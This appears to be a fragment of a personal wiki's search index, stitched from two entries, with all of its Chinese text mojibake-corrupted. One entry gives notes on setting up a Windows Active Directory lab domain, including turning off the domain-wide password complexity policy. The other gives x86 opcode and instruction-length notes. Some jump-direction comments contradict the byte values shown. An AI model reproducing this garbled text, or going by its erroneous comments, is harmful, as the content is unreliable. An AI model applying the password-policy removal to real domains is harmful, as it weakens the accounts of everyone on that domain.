DomainModeï¼šæŒ‡å®šåˆ›å»ºæ–°æ—æ—¶ç¬¬ä¸€ä¸ªåŸŸçš„åŸŸåŠŸèƒ½çº§åˆ«ã€‚ï¼ˆåŸŸæ§ç³»ç»Ÿç‰ˆæœ¬å¿…é¡»â‰¥åŸŸåŠŸèƒ½çº§åˆ«çš„ç³»ç»Ÿç‰ˆæœ¬ï¼‰ Windows Server 2003: 2 or Win2003 Windows Server 2008: 3 or Win2008 Windows Server 2008 R2: 4 or Win2008R2 Windows Server 2012: 5 or Win2012 Windows Server 2012 R2: 6 or Win2012R2 Windows Server 2016: 7 or WinThreshold DomainNameï¼šåŸŸå DomainNetbiosNameï¼šåŸŸçš„Netbiosåç§° ForestModeä¸DomainModeç­‰åŒï¼Œè¯¥é€‰é¡¹ä¸»è¦ç”¨äºå°½å¯èƒ½çš„è‡ªåŠ¨åŒ– æŒ‡å®šAD DSæ•°æ®åº“ã€æ—¥å¿—æ–‡ä»¶å’ŒSYSVOLçš„è·¯å¾„ DatabasePath LogPath SysvolPath InstallDnsï¼šæ˜¯å¦å®‰è£…DNSæœåŠ¡ NoRebootOnCompletionï¼šä¸é‡å¯å®Œæˆå®‰è£… å‘½ä»¤æ–¹å¼å®‰è£…ä¸æ‰‹åŠ¨å®‰è£…å¯¹åº”çš„åœ°æ–¹æ—¥å¿—è·¯å¾„å¯¹åº”æ‰‹åŠ¨å®‰è£…çš„è¿™é‡Œå‚è€ƒï¼šStep-By-Step : How to install and configure Domain Controller on Windows Server 2019æ‰§è¡ŒæŠ¥é”™ï¼šå› ä¸ºæœ¬åœ°ç®¡ç†å‘˜æ²¡å¯†ç æˆ–å¯†ç å¼ºåº¦ä¸å¤Ÿç»™æœ¬åœ°ç®¡ç†å‘˜è®¾å¯†ç ï¼Œat least 8-14 characters long and include a combination of uppercase and lowercase letters, digits, and symbols.1net user Administrator &lt;password&gt; è¿è¡Œåå¼¹çª—è¦è¾“å…¥SafeModeAdministratorPasswordï¼Œè¿™æ˜¯æŒ‡å®šActive DirectoryåŸŸæ§åˆ¶å™¨å®‰å…¨æ¨¡å¼ç®¡ç†å‘˜å¯†ç çš„å‚æ•°ã€‚åœ¨å®‰è£…æˆ–é…ç½®åŸŸæ§åˆ¶å™¨æ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªç‰¹æ®Šçš„å®‰å…¨æ¨¡å¼ç¯å¢ƒï¼Œç§°ä¸ºâ€œç›®å½•æœåŠ¡è¿˜åŸæ¨¡å¼â€ï¼ˆDirectory Services Restore Mode, DSRMï¼‰ï¼Œç”¨äºè¿›è¡Œç»´æŠ¤ã€æ¢å¤æˆ–è§£å†³ AD DS ç›¸å…³é—®é¢˜ã€‚åœ¨ DSRM ä¸‹ç™»å½•éœ€è¦ä¸€ä¸ªç‰¹å®šçš„è´¦æˆ·ï¼Œå³â€œå®‰å…¨æ¨¡å¼ç®¡ç†å‘˜â€ï¼Œå…¶æƒé™å…è®¸å¯¹ AD æ•°æ®åº“è¿›è¡Œæ›´æ”¹å’Œä¿®å¤ã€‚ å›è½¦ pwå›æ˜¾æœ‰warningï¼Œä¸ç”¨ç†ä¼š å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ğŸ“• æ­å»ºä¸€ä¸ªç®€å•çš„WindowsåŸŸç¯å¢ƒ ç›¸å…³é…ç½® åŸŸå¯†ç å¼ºåº¦é…ç½® å®‰è£…DCé‡å¯åï¼Œæ˜¯mytest/testç”¨æˆ·ç™»è¿›çš„ï¼Œæƒ³ç”¨åŸŸç®¡å°±åˆ‡æ¢ç”¨mytest/administratorç™»å½•ï¼Œå¯†ç æ˜¯ä¹‹å‰è®¾çš„å¯†ç ã€‚ ä¿®æ”¹åŸŸç®¡å¯†ç Win-Windows Administrative Tools-Active Directory Users and Computers å»æ‰å¯†ç å¼ºåº¦ç­–ç•¥ï¼Œå¯ä»¥è®¾ç½®ç®€å•å¯†ç ã€å…¨åŸŸç­–ç•¥ç”Ÿæ•ˆã€‘ï¼ˆè¦åŸŸç®¡è´¦å·ç™»è¿›ï¼‰ å‚è€ƒé“¾æ¥ğŸ”— WindowsåŸŸæ§å»æ‰å¯†ç å¼ºåº¦ç­–ç•¥ å¯ä»¥è®¾ç½®ç®€å•å¯†ç ã€å…¨åŸŸç­–ç•¥ç”Ÿæ•ˆã€‘_51CTOåšå®¢_åŸŸç”¨æˆ·å¯†ç ç­–ç•¥æ›´æ”¹ 1.è®¾ç½®Windows Server2008 r2çš„åŸŸå®‰å…¨ç­–ç•¥ã€‚_6å·ç‰¹å·¥çš„æŠ€æœ¯åšå®¢_51CTOåšå®¢ Tools-Group Policy Management é€‰æ‹©Group Policy Objects-Default Domain Controllers Policyï¼Œé€‰æ‹©Default Domain Policyï¼Œå³é”®ï¼Œç¼–è¾‘ æ”¹æˆå¦‚è¿™å¼ å›¾çš„æœªå®šä¹‰ï¼Œæ›´æ–°åä¸ä¼šç”Ÿæ•ˆï¼Œè¿˜æ˜¯æ”¹æˆä¸Šé¢é‚£å¼ å›¾çš„æ ·å­å§ ç®¡ç†å‘˜cmdï¼Œç”¨å¦‚ä¸‹å‘½ä»¤ç«‹å³æ›´æ–°ç”¨æˆ·åŠç»„ç­–ç•¥ï¼Œä¸ç”¨é‡å¯ç”Ÿæ•ˆ 1gpupdate /force åˆ›å»ºåŸŸæˆå‘˜è´¦å· åˆ›å»ºç”¨äºç™»å½•åŸŸçš„è´¦å· ä¸»è¦å†™ç™»å½•å ä¸ºäº†æ–¹ä¾¿ï¼Œæ°¸ä¸è¿‡æœŸ æˆå‘˜å…¥åŸŸ è®¾ç½®é¦–é€‰DNSæœåŠ¡å™¨ä¸ºDCçš„ipåœ°å€ åŠ å…¥åŸŸã€‚ä¼šå¼¹çª—ï¼Œè¾“å…¥åŸŸç®¡è´¦å·å’Œå¯†ç ï¼Œé‡å¯åç”¨åŸŸè´¦æˆ·ç™»è¿›ã€‚ æ³¨æ„æ˜¯**\\**ï¼Œmytest\\test01 DCä¸Šå¯ä»¥çœ‹åˆ°åŠ åˆ°åŸŸçš„ç”µè„‘ğŸ’»"},{"title":"å‰ç¼€æŒ‡ä»¤","path":"/wiki/x86InstructionSet/å‰ç¼€æŒ‡ä»¤.html","content":"123 å¯é€‰ CPUå¦‚ä½•çŸ¥é“è¿™æ¡æŒ‡ä»¤ä¸­å‰é¢çš„å­—èŠ‚è¯•å‰ç¼€æŒ‡ä»¤è¿˜OpCodeï¼Ÿæ ¹æ®è¿™ä¸ªæŒ‡ä»¤çš„å€¼å¾—çŸ¥çš„ã€‚æ¯”å¦‚55ï¼ˆpush ebpï¼‰ï¼Œå°±æ˜¯Opcodeï¼Œè€Œä¸æ˜¯å‰ç¼€æŒ‡ä»¤ã€‚æ¯”å¦‚æ˜¯66ï¼Œå°±æ˜¯å‰ç¼€æŒ‡ä»¤ã€‚å‰ç¼€æŒ‡ä»¤å°±é‚£ä¹ˆå‡ ä¸ªã€‚ åœ¨ODä¸­ä¸ºäº†æ–¹ä¾¿ç”¨æˆ·è§‚å¯Ÿï¼Œå‰ç¼€æŒ‡ä»¤åä¼šè·Ÿä¸€ä¸ªå†’å·ï¼š ä¾‹166: EC å‰ç¼€æŒ‡ä»¤åˆ†4ç»„ã€‚ä¸€æ¡x86æŒ‡ä»¤ä¸­æœ€å¤šæœ‰4ä¸ªå‰ç¼€æŒ‡ä»¤ï¼Œæ¯ç»„åªèƒ½å‡ºç°1ä¸ªå­—èŠ‚ æ²¡æœ‰é¡ºåºè¦æ±‚ 12F0:65:66:6767:66:65:F0 ç¬¬1ç»„ LOCKå‰ç¼€æŒ‡ä»¤ 1LOCK F0 ; é”åœ°å€æ€»çº¿ï¼Œå½“æœ‰ä¸€ä¸ªCPUï¼ˆæ ¸ï¼‰è®¿é—®è¯¥åœ°å€æ€»çº¿æ—¶ï¼Œå…¶ä»–æ ¸ä¸èƒ½è®¿é—®ï¼Œè¯¥æŒ‡ä»¤ç”¨äºåšäº’æ–¥æ§åˆ¶ï¼ˆï¼Ÿï¼‰ REPEATå‰ç¼€æŒ‡ä»¤ 12REPNE/REPNZ F2 ;ZFä¸ä¸º0æ—¶é‡å¤æ‰§è¡ŒREP/REPZ F3 ; ZFä¸º1æ—¶é‡å¤æ‰§è¡Œ ç¬¬2ç»„ æ®µå‰ç¼€æŒ‡ä»¤ï¼Œè¡¨æ˜ä½¿ç”¨å“ªä¸ªæ®µå¯„å­˜å™¨è¿›è¡Œå¯»å€ 1234562E ; CS æ®µå‰ç¼€36 ; SS æ®µå‰ç¼€3E ; DS æ®µå‰ç¼€26 ; ES æ®µå‰ç¼€64 ; FS æ®µå‰ç¼€65 ; GS æ®µå‰ç¼€ é»˜è®¤ç”¨DSæ®µå¯„å­˜å™¨å¯»å€ï¼ˆæŒ‡ä»¤å‰é¢ä¸ä¼šæ˜¾å¼å†™3Eï¼‰ æ“ä½œæ•°ä¸­æ¶‰åŠESPå’ŒEBPçš„æ“ä½œé»˜è®¤ä½¿ç”¨SSæ®µå¯„å­˜å™¨ ç¬¬3ç»„ æ“ä½œæ•°å®½åº¦å‰ç¼€æŒ‡ä»¤ï¼Œæ”¹å˜æ“ä½œæ•°å®½åº¦ 12366 ; ç”¨äºæ”¹å˜æ“ä½œæ•°é»˜è®¤å®½åº¦ ; å¦‚æœç›®å‰CPUæ˜¯16ä½æ¨¡å¼ï¼Œä¼šå°†æ“ä½œæ•°å®½åº¦æ”¹å˜ä¸º32 ; å¦‚æœç›®å‰CPUæ˜¯32ä½æ¨¡å¼ï¼Œä¼šå°†æ“ä½œæ•°å®½åº¦æ”¹å˜ä¸º16 ä¾‹1255 push ebp ;åœ¨CPUä¸º32ä½æ¨¡å¼ä¸‹ï¼Œæ“ä½œæ•°é»˜è®¤å®½åº¦æ˜¯3266:55 push bp ;åŠ ä¸Š66ï¼Œå°†æ“ä½œæ•°å®½åº¦æ”¹ä¸ºäº†16ä½ è¿™é‡Œçš„å®½åº¦ä¹‹æ‰€ä»¥æ˜¯32ä½æ˜¯å› ä¸ºå½“å‰CPUçš„æ¨¡å¼æ˜¯32ä½çš„ï¼Œæƒ³è¦çŸ¥é“å½“å‰CPUæ¨¡å¼å°±éœ€è¦æ¶‰åŠæ®µå¯„å­˜å™¨çš„çŸ¥è¯†ï¼Œè¿™é‡Œæˆ‘ä»¬ç®€å•äº†è§£ä¸‹ï¼ˆåç»­è¯¾ç¨‹æ·±å…¥äº†è§£ï¼‰ï¼Œåœ¨æ®µå¯„å­˜å™¨CSä¸­æœ‰ä¸€ä¸ªå±æ€§ä½ç§°ä¹‹ä¸ºDBä½ï¼Œå½“DBä½ä¸º1çš„æ—¶å€™å½“å‰CPUå¤„äº32ä½æ¨¡å¼ï¼Œä¸º0çš„æ—¶å€™å°±è¡¨ç¤ºå½“å‰CPUå¤„äº16ä½æ¨¡å¼ã€‚åœ¨è¿™é‡Œï¼ŒCPUæ˜¯32ä½æ¨¡å¼ï¼Œæ‰€ä»¥æ“ä½œæ•°é»˜è®¤çš„å®½åº¦æ˜¯32ã€‚ ï¼ˆä¸Šé¢æ˜¯æ‘˜æŠ„çš„ï¼Œåç»­è¿›è¡Œç¡®å®šï¼‰ csä¸­çš„dbä½ï¼Ÿ x64æ„æ¶çš„cpuä½¿ç”¨csæ®µå¯„å­˜å™¨æ¥ç¡®å®šcpuçš„è¿è¡Œæ¨¡å¼ã€‚åœ¨32ä½è¿›ç¨‹ä¸­ï¼Œcs=0x23ï¼›åœ¨64ä½è¿›ç¨‹ä¸­ï¼Œcs=0x33ã€‚å½“csè¢«æ›´æ”¹åï¼Œcpuçš„è¿è¡Œæ¨¡å¼ä¾¿ä¼šå‘ç”Ÿè½¬å˜ã€‚ ç¬¬4ç»„ åœ°å€å®½åº¦å‰ç¼€æŒ‡ä»¤ï¼Œæ”¹å˜é»˜è®¤çš„å¯»å€æ–¹å¼ 12367 ; ç”¨äºæ”¹å˜å¯»å€æ–¹å¼ ; å¦‚æœç›®å‰CPUæ˜¯16ä½æ¨¡å¼ï¼Œä¼šå°†å¯»å€æ–¹å¼æ”¹å˜ä¸º32ä½çš„å¯»å€æ–¹å¼ ; å¦‚æœç›®å‰CPUæ˜¯32ä½æ¨¡å¼ï¼Œä¼šå°†å¯»å€æ–¹å¼æ”¹å˜ä¸º16ä½çš„å¯»å€æ–¹å¼ 128965 E8 mov dword ptr ss:[ebp-18],esp67:8965 E8 mov dword ptr ds:[di+FFE0],esp OpCode OpCodeå†³å®šæ˜¯å¦æœ‰ModR/Mï¼ŒModR/Må†³å®šæ˜¯å¦æœ‰SIB OpCodeèƒ½å†³å®šæ•´æ¡æŒ‡ä»¤æ˜¯å®šé•¿è¿˜æ˜¯å˜é•¿æŒ‡ä»¤ 50å¼€å¤´ï¼Œå®šé•¿æŒ‡ä»¤ æ¯”å¦‚00å¼€å¤´ï¼Œé‚£ä»…å‡­OpCodeæ²¡æ³•ç¡®å®šæŒ‡ä»¤é•¿åº¦ï¼Œå³å˜é•¿æŒ‡ä»¤ OpCodeåæ²¡æœ‰MoR/Mï¼Œå°±æ˜¯å®šé•¿æŒ‡ä»¤ æœ‰çš„è¯ï¼Œæ˜¯å˜é•¿æŒ‡ä»¤ é‚£å¼ ä¸»è¡¨ä¸­æœ‰å¤§å†™çš„Eå’ŒGï¼Œè¡¨æ˜åé¢è·Ÿç€MoR/Mï¼Œå°±æ˜¯å˜é•¿æŒ‡ä»¤ åœ¨A.2.4.1 One-Byte Opcode Instructionsç‚¹Table A-2ä¼šè·³åˆ°ä¸€å¼ è¡¨ è¿™å¼ è¡¨æ˜¯ä¸»è¡¨ï¼Œç”¨äºåŒºåˆ†æŒ‡ä»¤æ˜¯å®šé•¿è¿˜æ˜¯å˜é•¿ 5è¡Œ,push 50ï¼Œpush eax 51ï¼Œpush ecx Zzè¡¨ç¤ºæ³• å«ä¹‰ï¼š A.2 KEY TO ABBREVIATIONS A.2.1 Codes for Addressing Method A.2.2 Codes for Operand Type å®šé•¿æŒ‡ä»¤_ä¿®æ”¹ERX 50-57 push ODå³è¾¹å¯„å­˜å™¨ä»ä¸Šåˆ°ä¸‹ 58-xx pop ODå³è¾¹å¯„å­˜å™¨ä»ä¸Šåˆ°ä¸‹ 0-7ï¼Œå¯„å­˜å™¨çš„é¡ºåºå›ºå®šä½äº† rAxï¼Œå¯ä»¥æ˜¯raxï¼Œeaxï¼Œax eAxï¼Œeaxï¼Œax ä¸»è¡¨4é‚£ä¸€è¡Œï¼Œ32ä½æ˜¯ä¸Šé¢ä¸€è¡Œï¼›CPUå¦‚æœæ˜¯64ä½ï¼Œæ˜¯ä¸‹é¢ä¸€è¡Œï¼ˆä¸åŒCPUæ¨¡å¼æ—¶å«ä¹‰ä¸åŒï¼‰ INCä¸Šé¢çš„i64ï¼Œè¡¨æ˜è¿™ä¸ªæŒ‡ä»¤åœ¨64ä½æ˜¯æ— æ•ˆçš„ å®šé•¿æŒ‡ä»¤ï¼šä¸€æ—¦OpCodeç¡®å®šäº†ï¼ŒæŒ‡ä»¤çš„é•¿åº¦å°±ç¡®å®šäº†ã€‚è€Œä¸æ˜¯å®šé•¿å°±æ˜¯æ•´ä¸ªæŒ‡ä»¤å®½åº¦ä¸º1 xchg eax,eaxï¼Œå’Œæ²¡äº¤æ¢ä¸€æ ·ï¼ŒåºŸè¯ï¼Œäºæ˜¯å¼„æˆå…¶ä»–å«ä¹‰äº†ï¼Œnop èŠ±æŒ‡ä»¤ 123900000 ;æ­£å¸¸æƒ…å†µä¸‹jmpåˆ°è¿™é‡Œ0000 12345B0 ;æ”¹ä¸ºB0ï¼Œä¸ºåœ¨å®ƒåé¢è¡¥å‡ ä¸ªå­—èŠ‚å˜æˆB0 0000 00 è¿˜åŸï¼Œå‡è®¾æ˜¯jmpåˆ° E8åœ°å€ï¼Œçœ‹è¿‡å»ï¼Œé‚£é‡Œçœ‹æ˜¯E7ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤æ˜¯E9ã€‚æ²¡æœ‰E8ï¼Œå°±æ˜¯è¢«åŠ èŠ±äº†ï¼Œæ”¹ä¸º90æ”¹å›å» d64ï¼Œè¯´æ˜è¿™ä¸ªæŒ‡ä»¤åé¢è·Ÿçš„æ“ä½œæ•°çš„å®½åº¦é»˜è®¤æ˜¯64ä½ï¼Œä¸æ”¯æŒ32ä½ å®šé•¿æŒ‡ä»¤_ä¿®æ”¹EIP jccå®šé•¿æŒ‡ä»¤ shortï¼Œ1ä¸ªå­—èŠ‚ 1ä¸ªå­—èŠ‚ï¼Œ00-7Fï¼Œå‘ä¸Šè·³ 80-FFï¼Œå‘ä¸‹è·³ 07:47 å¾…æ•´ç†çš„ ç”±6éƒ¨åˆ†ç»„æˆ å¸¸è¯†ï¼šæ¯ä¸€æ¡æŒ‡ä»¤ï¼Œæœ€çŸ­1å­—èŠ‚ï¼Œæœ€é•¿15å­—èŠ‚ å®šé•¿æŒ‡ä»¤_ä¿®æ”¹ERX push/pop 50-5Fç³»åˆ— 0-7ï¼Œ8-Få¯„å­˜å™¨é¡ºåºå°±æ˜¯ODå³è¾¹ä»ä¸Šåˆ°ä¸‹æ˜¾ç¤ºçš„å¯„å­˜å™¨çš„é¡ºåº 50-57 pushé€šç”¨å¯„å­˜å™¨123456780x50 PUSH EAX0x51 PUSH ECX0x52 PUSH EDX0x53 PUSH EBX0x54 PUSH ESP0x55 PUSH EBP0x56 PUSH ESI0x57 PUSH EDI 58-5F popé€šç”¨å¯„å­˜å™¨123456780x58\tPOP EAX0x59\tPOP ECX0x5A\tPOP EDX0x5B POP EBX0x5C POP ESP0x5D POP EBP0x5E\tPOP ESI0x5F POP EDI inc/dec 40-4Fç³»åˆ— 10x40 - 0x47 INC ERX 10x48 - 0x4F DEC ERX mov é€šç”¨å¯„å­˜å™¨ï¼Œç«‹å³æ•° B0-BFç³»åˆ— Ibï¼šbyteå¤§å°çš„ç«‹å³æ•°ï¼ˆImmediate dataï¼‰ï¼ŒèŒƒå›´00-FF MOV immediate byte into byte register123456780xB0 MOV AL,Ib0xB1 MOV CL,Ib0xB2 MOV DL,Ib0xB3 MOV BL,Ib0xB4 MOV AH,Ib0xB5 MOV CH,Ib0xB6 MOV DH,Ib0xB7 MOV BH,Ib ä¾‹12B0 00 MOV AL,00 ;ç»™alèµ‹å€¼00B1 8F\tMOV CL,8F ;ç»™clèµ‹å€¼8F rï¼šæ—¢å¯ä»¥æ˜¯EAXï¼Œä¹Ÿå¯ä»¥æ˜¯AX åœ¨CPUä¸º32ä½çš„æ¨¡å¼ä¸‹ï¼ŒåŠ å‰ç¼€æŒ‡ä»¤åï¼ŒB8å°±æ˜¯å°†ç«‹å³æ•°èµ‹å€¼ç»™16ä½çš„é€šç”¨å¯„å­˜å™¨ MOV immediate word or double into word, double, or quad register123456780xB8 MOV rAX,Iv0xB9 MOV rCX,Iv0xBA MOV rDX,Iv0xBB MOV rBX,Iv0xBC MOV rSP,Iv0xBD MOV rBP,Iv0xBE MOV rSI,Iv0xBF MOV rDI,Iv ä¾‹12B8 00000000 MOV EAX,00000000 ;ç»™EAXèµ‹å€¼00000000B9 12345678 MOV ECX,12345678 ;ç»™ECXèµ‹å€¼12345678 xchg 90-97ç³»åˆ— XCHG word, double-word or quad-word register with rAX12345670x91 XCHG EAX,ECX0x92 XCHG EAX,EDX0x93 XCHG EAX,EBX0x94 XCHG EAX,ESP0x95 XCHG EAX,EBP0x96 XCHG EAX,ESI0x97 XCHG EAX,EDI 0x90ï¼Œeaxå’Œeaxäº¤æ¢ï¼ŒåºŸè¯ã€‚äºæ˜¯0x90è®¾è®¡ä¸ºnopï¼Œå•¥ä¹Ÿä¸åš 1230x90 XCHG EAX,EAX ;eaxå’Œeaxäº¤æ¢ï¼ŒåºŸè¯0X90 nop ;å•¥ä¹Ÿä¸åš Intelå¯¹äº0å·å¯„å­˜å™¨eaxæœ‰ç‰¹æ®Šçš„ç…§é¡¾ï¼Œæ¯”å¦‚è¿™é‡Œçš„xchgå·¦è¾¹æ“ä½œæ•°éƒ½æ˜¯eaxã€‚ å®šé•¿æŒ‡ä»¤çš„æ„æ€ï¼ŒOpCodeå‡ºç°äº†ï¼Œé•¿åº¦å°±ç¡®å®šäº† OpCodeèƒ½ç¡®å®šæŒ‡ä»¤çš„é•¿åº¦-&gt;å®šé•¿æŒ‡ä»¤ å®šé•¿æŒ‡ä»¤_ä¿®æ”¹EIP jccæ®µå†…çŸ­è½¬ç§» 70-7Fç³»åˆ— 1Jcc Jbï¼ˆbyteå­—èŠ‚çš„åç§»ï¼‰ åé¢è·Ÿ1ä¸ªå­—èŠ‚ç«‹å³æ•°çš„åç§»ã€‚è¿™ä¸ªåç§»å½“æˆæœ‰ç¬¦å·çœ‹ 00-7Fï¼Œæ­£æ•°ï¼Œå‘ä¸‹/å‰ï¼ˆé«˜åœ°å€ï¼‰è·³ 80-FFï¼Œè´Ÿæ•°ï¼Œå‘ä¸Š/åï¼ˆä½åœ°å€ï¼‰è·³ è·³è½¬åˆ°çš„åœ°å€=å½“å‰æŒ‡ä»¤çš„åœ°å€+å½“å‰æŒ‡ä»¤é•¿åº¦+Ib åŸºäºä¸‹é¢ä¸¤ä¸ªå…¬å¼ç®—å‡ºæ¥çš„ï¼š ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€=å½“å‰æŒ‡ä»¤åœ°å€+å½“å‰æŒ‡ä»¤é•¿åº¦ è¦è·³è½¬çš„åœ°å€=ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€+åç§»é‡ Short-displacement jump on condition123456789101112131415160x70 JO0x71\tJNO0x72\tJB/JNAE/JC0x73\tJNB/JAE/JNC0x74\tJZ/JE0x75\tJNZ/JNE0x76\tJBE/JNA0x77\tJNBE/JA0x78\tJS0x79\tJNS0x7A\tJP/JPE0x7B\tJNP/JPO0x7C\tJL/JNGE0x7D\tJNL/JGE0x7E\tJLE/JNG0x7F\tJNLE/JG ä¾‹123004183D7 70 05 JO SHORT 004183DE ; OF=1æ—¶è·³è½¬ï¼Œå‘ä¸‹è·³5å­—èŠ‚004183DC 71 FB JNO SHORT 004183D9 ; OF=0æ—¶è·³è½¬ï¼Œå‘ä¸‹è·³5å­—èŠ‚ jccæ®µå†…è¿‘è½¬ç§» 0x0F 0x80 - 0x0F 0x8Fç³»åˆ— 123Jcc Jzï¼ˆåç§»ï¼‰z Word for 16-bit operand-size or doubleword for 32 or 64-bit operand-size. åé¢è·Ÿ4ä¸ªå­—èŠ‚ç«‹å³æ•°çš„åç§»ã€‚è¿™ä¸ªåç§»å½“æˆæœ‰ç¬¦å·çœ‹ 00-7FFFFFFFï¼Œæ­£æ•°ï¼Œå‘ä¸‹/å‰ï¼ˆé«˜åœ°å€ï¼‰è·³ 80-FFFFFFFFï¼Œè´Ÿæ•°ï¼Œå‘ä¸Š/åï¼ˆä½åœ°å€ï¼‰è·³ è·³è½¬åˆ°çš„åœ°å€=å½“å‰æŒ‡ä»¤çš„åœ°å€+å½“å‰æŒ‡ä»¤é•¿åº¦+Id Long-displacement jump on condition123456789101112131415160x0F 0x80 JO0x0F 0x81 JNO0x0F 0x82 JB/JNAE/JC0x0F 0x83 JNB/JAE/JNC0x0F 0x84 JZ/JE0x0F 0x85 JNZ/JNE0x0F 0x86 JBE/JNA0x0F 0x87 JNBE/JA0x0F 0x88 JS0x0F 0x89 JNS0x0F 0x8A JP/JPE0x0F 0x8B JNP/JPO0x0F 0x8C JL/JNGE0x0F 0x8D JNL/JGE0x0F 0x8E JLE/JNG0x0F 0x8F JNLE/JG ä¾‹123004183D7 0F82 05000000 jb 004183E2 ;å‘ä¸‹è·³5å­—èŠ‚004183D7 0F83 F0FFFFFF jnb 004183CD ;å‘ä¸‹è·³10å­—èŠ‚ å…¶ä»– 1234567891011121314151617181920210xE0 LOOPNE/LOOPNZ Jb å…±2å­—èŠ‚ éé›¶è·³è½¬ï¼Œæ‰§è¡Œè¿™è¡ŒæŒ‡ä»¤æ—¶ï¼Œç›¸å½“äºï¼š 1.ECX = ECX - 1 2.if ECX &gt; 0 and ZF = 0, jump to destination (è·³è½¬åœ°å€=å½“å‰æŒ‡ä»¤åœ°å€ + å½“å‰æŒ‡ä»¤é•¿åº¦ + Jb) 0XE1 LOOPE/LOOPZ Jb å…±2å­—èŠ‚ ç›¸ç­‰è·³è½¬ï¼Œæ‰§è¡Œè¿™è¡ŒæŒ‡ä»¤æ—¶ï¼Œç›¸å½“äºï¼š 1.ECX = ECX - 1 2.if ECX &gt; 0 and ZF = 1, jump to destination (è·³è½¬åœ°å€=å½“å‰æŒ‡ä»¤åœ°å€ + å½“å‰æŒ‡ä»¤é•¿åº¦ + Jb) 0XE2\tLOOP Jb å…±2å­—èŠ‚ æ‰§è¡Œè¿™è¡ŒæŒ‡ä»¤æ—¶ï¼Œç›¸å½“äºï¼š 1.ECX = ECX - 1 2.å¦‚æœECXä¸ç­‰äº0ï¼Œè·³è½¬åˆ°ç›®æ ‡åœ°å€ (è·³è½¬åœ°å€=å½“å‰æŒ‡ä»¤åœ°å€ + å½“å‰æŒ‡ä»¤é•¿åº¦ + Jb) 0XE3\tJrCXZ Jb (åœ¨32ä½æ¨¡å¼ä¸­,rCXä¸ºECX) å…±2å­—èŠ‚ å½“ ECX = 0 æ—¶è·³è½¬åˆ°ç›®æ ‡åœ°å€ (è·³è½¬åœ°å€=å½“å‰æŒ‡ä»¤åœ°å€ + å½“å‰æŒ‡ä»¤é•¿åº¦ + Ib) (è‡ªå·±æ§åˆ¶æ­¥é•¿) 1234560xE8\tCALL Jd (near call) å…±5å­—èŠ‚ CALLæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å…¥æ ˆåï¼Œè·³è½¬åˆ°ç›®æ ‡åœ°å€ (è·³è½¬åœ°å€ = å½“å‰æŒ‡ä»¤åœ°å€ + å½“å‰æŒ‡ä»¤é•¿åº¦ + Jb)0xE9\tJMP Jd (near jmp) å…±5å­—èŠ‚ è·³è½¬åˆ°ç›®æ ‡åœ°å€ (è·³è½¬åœ°å€ = å½“å‰æŒ‡ä»¤åœ°å€ + å½“å‰æŒ‡ä»¤é•¿åº¦ + Jb) 16ä½å®æ¨¡å¼ä¸‹åœ°å€æ€»çº¿20ä½ï¼Œè€Œæ®µå¯„å­˜å™¨åªæœ‰16ä½ï¼Œå¯»å€æ–¹å¼æ˜¯ 1(æ®µå¯„å­˜å™¨ &lt;&lt; 4) + offset åœ¨32ä½ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œé™¤fså¤–å…¶ä»–æ®µå¯„å­˜å™¨çš„Baseéƒ½æ˜¯0ã€‚æ®µå¯„å­˜å™¨åœ¨32ä½æ¨¡å¼ä¸­å¤±å»äº†16ä½å®æ¨¡å¼ä¸‹é™åˆ¶å¯»å€èŒƒå›´çš„åŠŸèƒ½ï¼Œä¸»è¦ç”¨äºæƒé™æ§åˆ¶ã€‚å¯¹äº16ä½å®æ¨¡å¼ï¼Œjmp far æŒ‡ä»¤æ„å‘³ç€è·¨æ®µè·³è½¬ã€‚ä½†åœ¨32ä½ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œè·¨æ®µçš„æ¦‚å¿µä¸å†é€‚ç”¨ï¼Œå› ä¸ºBaseéƒ½æ˜¯0ï¼Œä¹Ÿå°±ä¸å­˜åœ¨â€œè·¨æ®µâ€çš„è¯´æ³•ã€‚ Aï¼šç›´æ¥åœ°å€ 12340xEA\tJMP Ap (far jmp) å…±7å­—èŠ‚ (Apï¼šå…­å­—èŠ‚é•¿åº¦çš„ç›´æ¥åœ°å€) JMP CS:Id Apä¸­çš„é«˜2å­—èŠ‚å……å½“æ®µé€‰æ‹©å­ï¼Œèµ‹ç»™CSï¼Œ ä½4å­—èŠ‚ç›´æ¥èµ‹ç»™EIP ä¾‹1004183D7 &gt; EA 12345678 1B00 jmp far 001B:78563412 120xEB\tJMP Jb (short jmp) è·³è½¬åˆ°ç›®æ ‡åœ°å€ (è·³è½¬åœ°å€ = å½“å‰æŒ‡ä»¤åœ°å€ + å½“å‰æŒ‡ä»¤é•¿åº¦ + Jb) 12345678910111213141516171819200xC3 RET å…±1å­—èŠ‚ EIPå‡ºæ ˆ ç›¸å½“äºpop eip 0xC2\tRET Iw (near return )\tå…±3å­—èŠ‚ EIPå‡ºæ ˆåï¼ŒESP = ESP + Iw å†…å¹³æ ˆæ¯”å¦‚ret 8 ç›¸å½“äº1. pop eip 2. add esp,Iw0XCB\tRETF (far return) å…±1å­—èŠ‚\tå‡ºæ ˆ8ä¸ªå­—èŠ‚ ä½4ä¸ªå­—èŠ‚èµ‹å€¼ç»™EIPï¼Œé«˜4ä¸ªå­—èŠ‚ä¸­ä½2ä½ï¼ˆï¼Ÿå¾…ç¡®è®¤ï¼‰å……å½“æ®µé€‰æ‹©å­ï¼Œèµ‹ç»™CS ç›¸å½“äº1.pop eip 2.pop cs 0xCA\tRETF Iw å…±3å­—èŠ‚\tå‡ºæ ˆ8ä¸ªå­—èŠ‚ï¼Œ 1. ä½4ä¸ªå­—èŠ‚èµ‹å€¼ç»™EIPï¼Œé«˜4ä¸ªå­—èŠ‚ä¸­ä½2ä½ï¼ˆï¼Ÿå¾…ç¡®è®¤ï¼‰å……å½“æ®µé€‰æ‹©å­ï¼Œèµ‹ç»™CS 2. ESP = ESP + Iw å˜é•¿æŒ‡ä»¤ OpCodeèƒ½ç¡®å®šæ•´æ¡æŒ‡ä»¤é•¿åº¦çš„ï¼Œç§°ä¸ºå®šé•¿æŒ‡ä»¤ï¼›ä¸èƒ½çš„ï¼Œç§°ä¸ºå˜é•¿æŒ‡ä»¤ã€‚ 